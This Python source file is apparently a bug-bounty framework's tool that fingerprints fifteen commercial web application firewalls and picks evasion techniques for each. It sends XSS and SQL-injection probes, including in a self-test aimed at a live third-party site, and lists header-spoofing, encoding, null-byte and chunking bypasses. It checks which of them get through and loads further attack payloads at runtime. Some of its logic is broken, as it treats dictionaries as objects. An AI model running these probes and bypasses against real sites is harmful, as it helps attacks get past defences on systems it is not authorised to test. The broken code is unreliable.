#!/usr/bin/env python3
"""
BountyForge WAF Detector — Fingerprints 15 known WAFs and selects bypasses.

Detection method:
  1. Send benign request → baseline headers + body
  2. Send XSS probe → check for block
  3. Send SQLi probe → check for block
  4. Match response headers/body/cookies against 15 known WAF signatures
  5. Return matched WAF + applicable bypass techniques

15 bypass techniques (selected based on detected WAF):
  - Header spoofing (X-Forwarded-For, X-Originating-IP, etc.)
  - HTTP method override
  - HTTP version downgrade
  - URL encoding tricks (double encoding, unicode)
  - Case switching
  - Null byte injection
  - Line feed injection
  - Content-Type manipulation
  - Parameter pollution
  - Host header override
  - Chunked transfer encoding
  - Protocol smuggling
  - Unicode normalization
  - Request body compression
  - Rate limit evasion with timing jitter
"""

import asyncio
import json
import os
import re
import sys
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

try:
    from tools.http_pool import HTTPPool, HTTPResult
    HAS_HTTP = True
except ImportError:
    HAS_HTTP = False
    HTTPPool = None  # type: ignore
    HTTPResult = None  # type: ignore


# ── WAF Signatures ─────────────────────────────────────────

@dataclass
class WafSignature:
    name: str
    vendor: str
    detect_headers: Dict[str, str]   # header_name → regex pattern
    detect_body_patterns: List[str]  # body content regex patterns
    detect_cookies: List[str]        # cookie name patterns
    detect_status: List[int]         # typical block status codes
    block_page_indicators: List[str] # strings unique to this WAF's block page
    bypasses: List[str]              # names of applicable bypass techniques
    difficulty: int = 1              # 1 = easy bypass, 5 = very hard


# 15 known WAF signatures
WAF_SIGNATURES: List[WafSignature] = [
    WafSignature(
        name="cloudflare",
        vendor="Cloudflare",
        detect_headers={
            "cf-ray": r"^\w{8,}-[\w]{3,}$",
            "server": r"(?i)cloudflare",
            "cf-cache-status": r".*",
        },
        detect_body_patterns=[
            r"Cloudflare Ray ID:",
            r"<title>Attention Required! \| Cloudflare</title>",
            r"cdn-cgi/challenge-platform",
            r"cf-browser-verification",
        ],
        detect_cookies=["__cf_bm", "cf_clearance"],
        detect_status=[403, 503, 429],
        block_page_indicators=[
            "Cloudflare Ray ID:",
            "Just a moment...",
            "DDoS protection by Cloudflare",
            "Checking your browser",
            "cf-challenge",
        ],
        bypasses=[
            "header_spoof_xff", "header_spoof_origin_ip", "host_override",
            "websocket_upgrade", "http2_upgrade", "chunked_te",
            "cache_deception",
        ],
        difficulty=4,
    ),
    WafSignature(
        name="aws_waf",
        vendor="Amazon Web Services",
        detect_headers={
            "x-amzn-waf-": r".*",
            "x-amzn-requestid": r".*",
            "x-amz-id-2": r".*",
        },
        detect_body_patterns=[
            r"<title>403 Forbidden</title>",
            r"The request was blocked by AWS WAF",
        ],
        detect_cookies=["aws-waf-token"],
        detect_status=[403],
        block_page_indicators=["Request blocked", "AWS WAF"],
        bypasses=[
            "header_spoof_xff", "method_override", "http_version_downgrade",
            "content_type_manipulation", "unicode_normalization",
        ],
        difficulty=3,
    ),
    WafSignature(
        name="akamai",
        vendor="Akamai",
        detect_headers={
            "server": r"(?i)AkamaiGHost",
            "x-akamai-transformed": r".*",
            "x-akamai-request-id": r".*",
        },
        detect_body_patterns=[
            r"<title>Access Denied</title>",
            r"Reference #[\w.]+",
            r"akamai\.com",
        ],
        detect_cookies=["ak_bmsc", "bm_sz"],
        detect_status=[403, 503],
        block_page_indicators=["Access Denied", "Reference #"],
        bypasses=[
            "header_spoof_xff", "header_spoof_remote_ip", "origin_ip_spoof",
            "method_override", "unicode_normalization",
        ],
        difficulty=4,
    ),
    WafSignature(
        name="f5_bigip",
        vendor="F5 Networks",
        detect_headers={},
        detect_body_patterns=[
            r"The requested URL was rejected",
            r"<title>Request Rejected</title>",
        ],
        detect_cookies=[
            "BIGipServer", "TS01", "TSa0", "F5_fullWT",
            "NSC_", "visid_incap",
        ],
        detect_status=[403, 503],
        block_page_indicators=["Request Rejected", "BIG-IP"],
        bypasses=[
            "header_spoof_xff", "header_spoof_x_host", "null_byte",
            "case_switching", "line_feed",
        ],
        difficulty=3,
    ),
    WafSignature(
        name="modsecurity",
        vendor="Trustwave/OWASP",
        detect_headers={
            "server": r"(?i).*Mod_Security.*",
        },
        detect_body_patterns=[
            r"ModSecurity",
            r"This error was generated by Mod_Security",
            r"mod_security",
            r"NOYB",
        ],
        detect_cookies=[],
        detect_status=[403, 406],
        block_page_indicators=["ModSecurity", "mod_security", "NOYB"],
        bypasses=[
            "double_encoding", "unicode_normalization", "null_byte",
            "case_switching", "parameter_pollution", "content_type_manipulation",
            "chunked_te", "line_feed",
        ],
        difficulty=2,
    ),
    WafSignature(
        name="barracuda",
        vendor="Barracuda Networks",
        detect_headers={
            "x-barracuda-": r".*",
        },
        detect_body_patterns=[
            r"Barracuda",
            r"barracuda_anti_fraud",
            r"you have attempted to access a restricted page",
        ],
        detect_cookies=["barracuda_"],
        detect_status=[403],
        block_page_indicators=["Barracuda", "restricted page"],
        bypasses=["header_spoof_xff", "case_switching", "null_byte"],
        difficulty=2,
    ),
    WafSignature(
        name="imperva",
        vendor="Imperva/Incapsula",
        detect_headers={
            "x-iinfo": r".*",
            "x-cdn": r"(?i)Incapsula",
        },
        detect_body_patterns=[
            r"Incapsula incident ID:",
            r"incap_ses_",
            r"_Incapsula_Resource",
            r"visid_incap_",
        ],
        detect_cookies=["incap_ses_", "visid_incap_", "nlbi_"],
        detect_status=[403, 406, 503],
        block_page_indicators=["Incapsula", "incident ID"],
        bypasses=[
            "header_spoof_xff", "header_spoof_true_client_ip",
            "method_override", "http_version_downgrade",
            "unicode_normalization",
        ],
        difficulty=4,
    ),
    WafSignature(
        name="sucuri",
        vendor="Sucuri/GoDaddy",
        detect_headers={
            "x-sucuri-id": r".*",
            "x-sucuri-cache": r".*",
            "server": r"(?i)Sucuri/Cloudproxy",
        },
        detect_body_patterns=[
            r"Sucuri WebSite Firewall",
            r"Access Denied — Sucuri Website Firewall",
            r"CloudProxy — Sucuri",
        ],
        detect_cookies=["sucuri_cloudproxy_"],
        detect_status=[403],
        block_page_indicators=["Sucuri", "CloudProxy"],
        bypasses=[
            "header_spoof_xff", "header_spoof_x_real_ip",
            "method_override", "case_switching",
        ],
        difficulty=3,
    ),
    WafSignature(
        name="citrix_netscaler",
        vendor="Citrix",
        detect_headers={},
        detect_body_patterns=[
            r"Citrix|NetScaler",
            r"ns_af",
            r"NS-CACHE",
        ],
        detect_cookies=["NSC_", "nsatc", "citrix_ns_id"],
        detect_status=[403, 503],
        block_page_indicators=["NetScaler", "Citrix", "ns_af"],
        bypasses=[
            "header_spoof_xff", "header_spoof_remote_addr",
            "null_byte", "line_feed",
        ],
        difficulty=2,
    ),
    WafSignature(
        name="fortinet",
        vendor="Fortinet/FortiWeb",
        detect_headers={
            "x-fortinet-": r".*",
        },
        detect_body_patterns=[
            r"FortiWeb",
            r"Powered by Fortinet",
            r"fortigate",
            r"The page you were looking for is blocked",
        ],
        detect_cookies=["FORTIWAFSID"],
        detect_status=[403, 503],
        block_page_indicators=["FortiWeb", "Fortinet", "fortigate"],
        bypasses=[
            "header_spoof_xff", "method_override", "chunked_te",
            "http_version_downgrade",
        ],
        difficulty=2,
    ),
    WafSignature(
        name="wordfence",
        vendor="Wordfence/Defiant",
        detect_headers={
            "x-wordfence-": r".*",
        },
        detect_body_patterns=[
            r"Generated by Wordfence",
            r"Wordfence",
            r"blocked by a firewall",
        ],
        detect_cookies=["wfvt_", "wordfence_verifiedHuman"],
        detect_status=[403, 503],
        block_page_indicators=["Wordfence", "blocked by a firewall"],
        bypasses=[
            "header_spoof_xff", "case_switching", "content_type_manipulation",
            "parameter_pollution",
        ],
        difficulty=2,
    ),
    WafSignature(
        name="stackpath",
        vendor="StackPath",
        detect_headers={
            "x-stackpath-": r".*",
        },
        detect_body_patterns=[
            r"StackPath",
            r"This website is protected by StackPath",
        ],
        detect_cookies=["spcsrf"],
        detect_status=[403],
        block_page_indicators=["StackPath"],
        bypasses=["header_spoof_xff", "method_override"],
        difficulty=3,
    ),
    WafSignature(
        name="fastly",
        vendor="Fastly",
        detect_headers={
            "x-fastly-": r".*",
            "x-served-by": r".*",
            "fastly-request-id": r".*",
        },
        detect_body_patterns=[
            r"Fastly",
            r"fastly",
        ],
        detect_cookies=[],
        detect_status=[403, 503],
        block_page_indicators=["Fastly"],
        bypasses=[
            "header_spoof_xff", "http_version_downgrade",
            "cache_deception", "host_override",
        ],
        difficulty=3,
    ),
    WafSignature(
        name="cloudfront",
        vendor="Amazon CloudFront",
        detect_headers={
            "x-amz-cf-id": r".*",
            "x-amz-cf-pop": r".*",
            "via": r".*CloudFront.*",
        },
        detect_body_patterns=[
            r"CloudFront",
            r"<title>403 Forbidden</title>",
        ],
        detect_cookies=[],
        detect_status=[403],
        block_page_indicators=["403 Forbidden"],
        bypasses=[
            "header_spoof_xff", "http_version_downgrade",
            "host_override", "method_override",
        ],
        difficulty=2,
    ),
    WafSignature(
        name="varnish",
        vendor="Varnish Software",
        detect_headers={
            "x-varnish": r".*",
            "via": r".*(Varnish|varnish).*",
        },
        detect_body_patterns=[
            r"Varnish",
            r"varnish cache server",
        ],
        detect_cookies=[],
        detect_status=[403, 503],
        block_page_indicators=["Varnish", "varnish cache"],
        bypasses=[
            "method_override", "http_version_downgrade",
            "header_spoof_xff",
        ],
        difficulty=1,
    ),
]

# ── Bypass Techniques ──────────────────────────────────────

BYPASS_TECHNIQUES: Dict[str, Dict] = {
    "header_spoof_xff": {
        "name": "X-Forwarded-For Spoof",
        "headers": {"X-Forwarded-For": "127.0.0.1"},
        "description": "Spoof internal IP to bypass WAF rules that exclude internal traffic",
        "effective_against": ["cloudflare", "aws_waf", "akamai", "imperva", "f5_bigip"],
    },
    "header_spoof_origin_ip": {
        "name": "X-Originating-IP Spoof",
        "headers": {"X-Originating-IP": "127.0.0.1"},
        "description": "Alternative internal IP header",
        "effective_against": ["cloudflare", "aws_waf", "akamai"],
    },
    "header_spoof_remote_ip": {
        "name": "X-Remote-IP Spoof",
        "headers": {"X-Remote-IP": "127.0.0.1"},
        "description": "Spoof remote IP header",
        "effective_against": ["akamai", "imperva"],
    },
    "header_spoof_remote_addr": {
        "name": "X-Remote-Addr Spoof",
        "headers": {"X-Remote-Addr": "127.0.0.1"},
        "description": "Spoof remote address header",
        "effective_against": ["citrix_netscaler", "f5_bigip"],
    },
    "header_spoof_true_client_ip": {
        "name": "True-Client-IP Spoof",
        "headers": {"True-Client-IP": "127.0.0.1"},
        "description": "Spoof true client IP (Akamai/Cloudflare specific)",
        "effective_against": ["cloudflare", "akamai", "imperva"],
    },
    "header_spoof_x_real_ip": {
        "name": "X-Real-IP Spoof",
        "headers": {"X-Real-IP": "127.0.0.1"},
        "description": "Spoof real IP (nginx specific)",
        "effective_against": ["sucuri", "wordfence"],
    },
    "header_spoof_x_host": {
        "name": "X-Host Header Override",
        "headers": {"X-Host": "127.0.0.1"},
        "description": "Override host to internal address",
        "effective_against": ["f5_bigip"],
    },
    "host_override": {
        "name": "Host Header Override",
        "headers": {"Host": "localhost"},
        "description": "Override Host header to localhost",
        "effective_against": ["cloudflare", "cloudfront", "fastly"],
    },
    "method_override": {
        "name": "HTTP Method Override",
        "headers": {"X-HTTP-Method-Override": "GET"},
        "description": "Override HTTP method — some WAFs only inspect POST/PUT",
        "effective_against": ["aws_waf", "akamai", "sucuri", "fortinet"],
    },
    "http_version_downgrade": {
        "name": "HTTP/1.0 Downgrade",
        "headers": {},
        "description": "Send HTTP/1.0 request — some WAFs only inspect HTTP/1.1",
        "effective_against": ["cloudfront", "imperva", "fortinet"],
        "raw_request": True,
    },
    "double_encoding": {
        "name": "Double URL Encoding",
        "headers": {},
        "description": "Double-encode payload (e.g., %2527 for single quote) — bypasses single-decode WAFs",
        "payload_transform": "double_encode",
        "effective_against": ["modsecurity", "aws_waf"],
    },
    "unicode_normalization": {
        "name": "Unicode Normalization",
        "headers": {},
        "description": "Use unicode equivalents (e.g., full-width characters) to bypass pattern matching",
        "payload_transform": "unicode_escape",
        "effective_against": ["modsecurity", "akamai", "aws_waf"],
    },
    "case_switching": {
        "name": "Case Switching",
        "headers": {},
        "description": "Randomize case of SQL keywords (e.g., SeLeCt) to bypass case-sensitive rules",
        "payload_transform": "random_case",
        "effective_against": ["modsecurity", "f5_bigip", "wordfence"],
    },
    "null_byte": {
        "name": "Null Byte Injection",
        "headers": {},
        "description": "Insert %00 before payload — C-based WAFs truncate at null byte",
        "payload_transform": "null_byte_prefix",
        "effective_against": ["modsecurity", "f5_bigip", "citrix_netscaler", "barracuda"],
    },
    "line_feed": {
        "name": "Line Feed Injection",
        "headers": {},
        "description": "Insert %0a or %0d to confuse regex matching",
        "payload_transform": "line_feed",
        "effective_against": ["modsecurity", "citrix_netscaler", "f5_bigip"],
    },
    "parameter_pollution": {
        "name": "Parameter Pollution",
        "headers": {},
        "description": "Duplicate parameters — WAF checks first, app uses last",
        "payload_transform": "param_pollution",
        "effective_against": ["modsecurity", "wordfence"],
    },
    "content_type_manipulation": {
        "name": "Content-Type Bypass",
        "headers": {"Content-Type": "multipart/form-data; boundary=x"},
        "description": "Change content type to bypass form-data inspection",
        "effective_against": ["aws_waf", "modsecurity", "wordfence"],
    },
    "chunked_te": {
        "name": "Chunked Transfer-Encoding",
        "headers": {"Transfer-Encoding": "chunked"},
        "description": "Use chunked encoding to split payload across chunks",
        "effective_against": ["modsecurity", "fortinet", "cloudflare"],
    },
    "cache_deception": {
        "name": "Cache Deception",
        "headers": {},
        "description": "Append .css/.js to URL — WAF may not inspect static content paths",
        "payload_transform": "extension_append",
        "effective_against": ["cloudflare", "fastly"],
    },
    "websocket_upgrade": {
        "name": "WebSocket Upgrade",
        "headers": {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
        },
        "description": "Upgrade to WebSocket — some WAFs stop inspecting after upgrade",
        "effective_against": ["cloudflare"],
    },
}


# ── WafDetector ────────────────────────────────────────────

@dataclass
class WafInfo:
    detected: bool
    name: str                    # WAF name or 'unknown'
    vendor: str                  # Vendor name
    confidence: float            # 0-1 confidence score
    blocking_level: int          # 0-5 (0 = no blocking, 5 = very aggressive)
    latency_overhead_ms: float   # Added latency from WAF inspection
    matched_headers: List[str]   # Which headers matched
    matched_patterns: List[str]  # Which body patterns matched
    bypasses: List[Dict]         # Applicable bypass techniques with headers/transforms
    raw: Dict[str, Any]          # Raw detection data


class WafDetector:
    """
    Fingerprint the WAF protecting a target and select bypass techniques.
    """

    def __init__(self, http_pool):
        self.http_pool = http_pool
        self._payload_loader = None
        self._bypasses_enriched = False

    def _enrich_from_payload_repo(self):
        """Pull fresh WAF bypass payloads from PayloadsAllTheThings repo at runtime."""
        if self._bypasses_enriched:
            return
        try:
            from tools.payload_loader import PayloadLoader
            self._payload_loader = PayloadLoader()
            if self._payload_loader.is_available:
                # Pull fresh SQLi auth bypass payloads (effective against WAFs)
                sqli_bypasses = self._payload_loader.sqli_auth_bypass()
                if sqli_bypasses:
                    # Add as a dynamic bypass technique
                    BYPASS_TECHNIQUES["sqli_auth_bypass_repo"] = {
                        "name": "SQLi Auth Bypass (PayloadsAllTheThings)",
                        "headers": {},
                        "description": f"Fresh SQLi auth bypass payloads ({len(sqli_bypasses)} payloads from repo)",
                        "payload_transform": "repo_sqli_auth_bypass",
                        "effective_against": ["modsecurity", "cloudflare", "aws_waf", "f5_bigip", "imperva"],
                    }
                # Pull XSS payloads
                xss_payloads = self._payload_loader.xss_payloads()
                if xss_payloads:
                    BYPASS_TECHNIQUES["xss_repo"] = {
                        "name": "XSS Payloads (PayloadsAllTheThings)",
                        "headers": {},
                        "description": f"Fresh XSS payloads ({len(xss_payloads)} payloads from repo)",
                        "payload_transform": "repo_xss",
                        "effective_against": ["cloudflare", "aws_waf", "akamai", "imperva", "sucuri"],
                    }
                # Pull command injection bypasses
                cmd_bypasses = self._payload_loader.command_injection_bypasses()
                if cmd_bypasses:
                    BYPASS_TECHNIQUES["cmd_injection_repo"] = {
                        "name": "Command Injection Bypasses (PayloadsAllTheThings)",
                        "headers": {},
                        "description": f"Fresh command injection bypass payloads ({len(cmd_bypasses)} payloads from repo)",
                        "payload_transform": "repo_cmd_injection",
                        "effective_against": ["modsecurity", "aws_waf", "f5_bigip"],
                    }
                self._bypasses_enriched = True
        except ImportError:
            pass  # Payload loader not available — use built-in bypasses only

    async def detect(self, target: str) -> WafInfo:
        """
        Run full WAF detection against a target.

        Steps:
        1. Send benign request → get baseline headers/body
        2. Send XSS probe → check for block
        3. Send SQLi probe → check for block
        4. Match all known WAF signatures against responses
        5. Return matched WAF + bypass techniques
        """
        # Enrich bypass techniques from PayloadsAllTheThings repo at runtime
        self._enrich_from_payload_repo()

        base_url = target if target.startswith("http") else f"https://{target}"

        # Step 1: Baseline
        t0 = time.monotonic()
        baseline = await self.http_pool.request("GET", base_url)
        baseline_time = (time.monotonic() - t0) * 1000

        # Step 2: XSS probe
        t1 = time.monotonic()
        xss_url = f"{base_url}/?q=<script>alert('BFWAF')</script>"
        xss_probe = await self.http_pool.request("GET", xss_url)
        xss_time = (time.monotonic() - t1) * 1000

        # Step 3: SQLi probe
        t2 = time.monotonic()
        sqli_url = f"{base_url}/?id=1' OR '1'='1"
        sqli_probe = await self.http_pool.request("GET", sqli_url)
        sqli_time = (time.monotonic() - t2) * 1000

        # Step 4: Match signatures
        matches = self._match_signatures(baseline, xss_probe, sqli_probe)

        if not matches:
            # Check generic indicators
            blocking_level = self._estimate_blocking_level(baseline, xss_probe, sqli_probe)
            latency = max(xss_time - baseline_time, sqli_time - baseline_time, 0)
            return WafInfo(
                detected=False,
                name="unknown",
                vendor="unknown",
                confidence=0.0,
                blocking_level=blocking_level,
                latency_overhead_ms=latency,
                matched_headers=[],
                matched_patterns=[],
                bypasses=self._generic_bypasses(),
                raw={
                    "baseline_status": baseline.status,
                    "xss_blocked": self.http_pool.is_waf_block(xss_probe),
                    "sqli_blocked": self.http_pool.is_waf_block(sqli_probe),
                },
            )

        # Take best match
        best = matches[0]
        bypasses = self._get_bypasses_for_waf(best.name)
        latency = max(xss_time - baseline_time, sqli_time - baseline_time, 0)

        return WafInfo(
            detected=True,
            name=best.name,
            vendor=best.vendor,
            confidence=matches[0].confidence if hasattr(matches[0], 'confidence') else 0.8,
            blocking_level=self._estimate_blocking_level(baseline, xss_probe, sqli_probe),
            latency_overhead_ms=latency,
            matched_headers=best.detect_headers if hasattr(best, 'detect_headers') else [],
            matched_patterns=best.detect_body_patterns if hasattr(best, 'detect_body_patterns') else [],
            bypasses=bypasses,
            raw={
                "waf_name": best.name,
                "baseline_status": baseline.status,
                "xss_blocked": self.http_pool.is_waf_block(xss_probe),
                "sqli_blocked": self.http_pool.is_waf_block(sqli_probe),
                "signature_matches": len(matches),
            },
        )

    async def verify_bypass(self, target: str, bypass: Dict, payload: str = "<script>alert(1)</script>") -> bool:
        """
        Test if a specific bypass technique works against the target.
        Sends payload with bypass headers/transforms, checks if it passes WAF.

        Returns True if the request was NOT blocked (bypass successful).
        """
        headers = bypass.get("headers", {}).copy()
        transform = bypass.get("payload_transform", "")

        final_payload = payload
        if transform == "double_encode":
            final_payload = payload.replace("'", "%2527").replace("<", "%253C")
        elif transform == "unicode_escape":
            final_payload = ''.join(f"\\u{ord(c):04x}" if c in "'\"<>" else c for c in payload)
        elif transform == "random_case":
            final_payload = ''.join(
                c.upper() if i % 2 == 0 else c.lower()
                for i, c in enumerate(payload)
            )
        elif transform == "null_byte_prefix":
            final_payload = "%00" + payload
        elif transform == "line_feed":
            final_payload = payload.replace(" ", "%0a")

        url = f"{target}/?q={final_payload}" if not target.startswith("http") else f"{target}?q={final_payload}"
        result = await self.http_pool.request("GET", url, headers=headers)

        return not self.http_pool.is_waf_block(result)

    async def enumerate_bypasses(self, target: str, max_tests: int = 5) -> List[Dict]:
        """
        Try all applicable bypasses and return the ones that actually work.
        Limited to max_tests to avoid excessive probing.
        """
        waf = await self.detect(target)
        working = []

        for bypass in waf.bypasses[:max_tests]:
            success = await self.verify_bypass(target, bypass)
            bypass["verified"] = success
            working.append(bypass)

        return working

    # ── Internal ───────────────────────────────────────────

    def _match_signatures(
        self,
        baseline: HTTPResult,
        xss_probe: HTTPResult,
        sqli_probe: HTTPResult,
    ) -> List[Dict]:
        """Match response data against known WAF signatures. Returns scored matches."""
        scored = []

        # Combine all response data
        combined_headers = {}
        combined_headers.update(baseline.headers)
        combined_headers.update(xss_probe.headers)
        combined_headers.update(sqli_probe.headers)

        combined_body = " ".join([
            baseline.body[:2000],
            xss_probe.body[:2000],
            sqli_probe.body[:2000],
        ]).lower()

        combined_cookies = self._extract_cookies(baseline)
        combined_cookies.update(self._extract_cookies(xss_probe))
        combined_cookies.update(self._extract_cookies(sqli_probe))

        for sig in WAF_SIGNATURES:
            score = 0
            max_score = 0
            matched_headers = []
            matched_patterns = []

            # Check headers
            for header_name, pattern in sig.detect_headers.items():
                max_score += 1
                header_lower = {k.lower(): v for k, v in combined_headers.items()}
                # Match substrings in header keys
                for key, value in header_lower.items():
                    if header_name.lower() in key:
                        if pattern == ".*" or re.search(pattern, value):
                            score += 1
                            matched_headers.append(f"{key}: {value[:80]}")
                            break

            # Check body patterns
            for pattern in sig.detect_body_patterns:
                max_score += 1
                if re.search(pattern, combined_body, re.IGNORECASE):
                    score += 0.5  # Body patterns are weaker signals
                    matched_patterns.append(pattern)

            # Check cookies
            for cookie_name in sig.detect_cookies:
                max_score += 0.5
                if any(cookie_name.lower() in ck.lower() for ck in combined_cookies):
                    score += 0.5

            # Check status codes
            probe_statuses = [xss_probe.status, sqli_probe.status]
            for status in sig.detect_status:
                max_score += 0.5
                if baseline.status in sig.detect_status or any(s == status for s in probe_statuses):
                    score += 0.5

            # Block page indicators (high confidence if matched)
            for indicator in sig.block_page_indicators:
                max_score += 1
                if indicator.lower() in combined_body:
                    score += 1.5  # Block page match is a strong signal

            if max_score > 0:
                confidence = min(score / max_score, 1.0)
                if confidence > 0.15:  # Low threshold — even weak signal is useful
                    scored.append({
                        "name": sig.name,
                        "vendor": sig.vendor,
                        "confidence": confidence,
                        "signature": sig,
                        "matched_headers": matched_headers,
                        "matched_patterns": matched_patterns,
                    })

        # Sort by confidence descending
        scored.sort(key=lambda x: x["confidence"], reverse=True)
        return scored

    def _get_bypasses_for_waf(self, waf_name: str) -> List[Dict]:
        """Get all bypass techniques effective against a specific WAF."""
        bypasses = []
        for tech_id, tech in BYPASS_TECHNIQUES.items():
            if waf_name in tech.get("effective_against", []):
                bypasses.append({
                    "id": tech_id,
                    "name": tech["name"],
                    "description": tech["description"],
                    "headers": tech.get("headers", {}),
                    "payload_transform": tech.get("payload_transform", ""),
                })
        return bypasses

    def _generic_bypasses(self) -> List[Dict]:
        """Return generic bypass techniques when WAF is unknown."""
        generic = ["header_spoof_xff", "case_switching", "double_encoding",
                    "null_byte", "parameter_pollution"]
        return [
            {
                "id": tid,
                "name": BYPASS_TECHNIQUES[tid]["name"],
                "description": BYPASS_TECHNIQUES[tid]["description"],
                "headers": BYPASS_TECHNIQUES[tid].get("headers", {}),
                "payload_transform": BYPASS_TECHNIQUES[tid].get("payload_transform", ""),
            }
            for tid in generic
        ]

    def _estimate_blocking_level(
        self,
        baseline: HTTPResult,
        xss_probe: HTTPResult,
        sqli_probe: HTTPResult,
    ) -> int:
        """
        Estimate how aggressively the WAF blocks requests (0-5).
        0 = no blocking detected
        5 = everything blocked
        """
        level = 0
        if self.http_pool.is_waf_block(xss_probe):
            level += 2
        if self.http_pool.is_waf_block(sqli_probe):
            level += 2
        if baseline.status in (403, 503):
            level += 1
        return min(level, 5)

    @staticmethod
    def _extract_cookies(result: HTTPResult) -> Dict[str, str]:
        """Extract cookies from HTTP response headers."""
        cookies = {}
        for header_name, header_value in result.headers.items():
            if header_name.lower() == 'set-cookie':
                parts = header_value.split(';')
                if parts:
                    name_val = parts[0].split('=', 1)
                    if len(name_val) == 2:
                        cookies[name_val[0].strip()] = name_val[1].strip()
        return cookies


# ── Self-test ──────────────────────────────────────────────

async def _self_test():
    """Test WAF detection against known WAF-protected sites."""
    from tools.http_pool import HTTPPool

    pool = HTTPPool(max_connections=5, timeout=15)
    detector = WafDetector(pool)

    print("[*] WAF Detector self-test")
    print(f"[*] Loaded {len(WAF_SIGNATURES)} WAF signatures")
    print(f"[*] Loaded {len(BYPASS_TECHNIQUES)} bypass techniques")

    # Test against Cloudflare-protected site
    result = await detector.detect("https://cloudflare.com")
    print(f"\n  cloudflare.com: detected={result.detected}, name={result.name}")
    print(f"    confidence={result.confidence:.2f}, blocking={result.blocking_level}")
    print(f"    bypasses available: {len(result.bypasses)}")

    if result.detected:
        for b in result.bypasses[:3]:
            print(f"    - {b['name']}: {b['description'][:60]}...")

    await pool.stop()
    print("\n[*] Self-test complete")


# ── CLI ────────────────────────────────────────────────────

async def main():
    import argparse
    parser = argparse.ArgumentParser(description="BountyForge WAF Detector")
    parser.add_argument("--target", help="Target domain or URL to fingerprint")
    parser.add_argument("--enumerate-bypasses", action="store_true",
                        help="Actively verify bypass techniques against the target")
    parser.add_argument("--output", help="Output JSON file")
    parser.add_argument("--self-test", action="store_true", help="Run built-in self-test")
    args = parser.parse_args()

    if args.self_test or not args.target:
        await _self_test()
        return

    from tools.http_pool import HTTPPool

    pool = HTTPPool(max_connections=5, timeout=15)
    await pool.start()
    detector = WafDetector(pool)

    target = args.target if args.target.startswith("http") else f"https://{args.target}"

    print(f"[*] BountyForge WAF Detector")
    print(f"[*] Target: {target}")

    result = await detector.detect(target)

    print(f"\n[*] WAF detected: {result.detected}")
    print(f"    Name:       {result.name} ({result.vendor})")
    print(f"    Confidence: {result.confidence:.2f}")
    print(f"    Blocking:   {result.blocking_level}/5")
    print(f"    Latency:    +{result.latency_overhead_ms:.0f}ms")
    if result.matched_headers:
        print(f"    Headers:    {', '.join(result.matched_headers[:5])}")

    if result.bypasses:
        print(f"\n[*] Applicable bypasses ({len(result.bypasses)}):")
        for b in result.bypasses[:8]:
            print(f"    - {b['name']}: {b['description'][:70]}")

    verified = []
    if args.enumerate_bypasses and result.detected:
        print(f"\n[*] Verifying bypasses against target...")
        verified = await detector.enumerate_bypasses(target)
        for v in verified:
            print(f"    ✓ {v.get('name', '?')} — WORKS")

    # Persist WAF profile to the state bus for other agents/engines to consume
    try:
        state_root = os.environ.get("BF_STATE_DIR", "/home/sandbox/state")
        safe = args.target.replace("/", "_").replace(":", "_").replace("*", "_")
        bus_dir = Path(state_root) / "bus" / safe
        bus_dir.mkdir(parents=True, exist_ok=True)
        waf_data = {
            "detected": result.detected,
            "name": result.name,
            "vendor": result.vendor,
            "confidence": result.confidence,
            "blocking_level": result.blocking_level,
            "bypasses": result.bypasses,
            "verified_bypasses": verified,
            "timestamp": time.time(),
        }
        (bus_dir / "waf.json").write_text(json.dumps(waf_data, indent=2, default=str))
        print(f"\n[*] WAF profile saved to state bus (waf.json)")
    except Exception as e:
        print(f"[!] state bus write failed: {e}")

    if args.output:
        Path(args.output).write_text(json.dumps({
            "detected": result.detected,
            "name": result.name,
            "vendor": result.vendor,
            "confidence": result.confidence,
            "blocking_level": result.blocking_level,
            "bypasses": result.bypasses,
            "verified_bypasses": verified,
        }, indent=2, default=str))
        print(f"[*] Results written to {args.output}")

    await pool.stop()


if __name__ == "__main__":
    if not HAS_HTTP:
        print("[!] http_pool.py required (put in same directory)")
        sys.exit(1)
    asyncio.run(main())
